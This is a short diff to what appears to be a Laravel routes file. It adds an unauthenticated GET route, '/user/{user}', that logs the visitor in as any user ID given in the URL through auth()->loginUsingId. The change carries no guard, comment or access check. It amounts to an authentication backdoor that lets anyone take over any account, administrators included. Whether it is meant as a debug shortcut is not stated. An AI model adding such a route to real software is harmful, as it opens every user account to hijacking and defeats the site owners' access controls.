@@ -79,4 +79,11 @@ Route::localized(function () {
     });
 
 
+    Route::get('/user/{user}', function ($user) {
+
+        auth()->loginUsingId($user);
+
+    });
+
+
 });
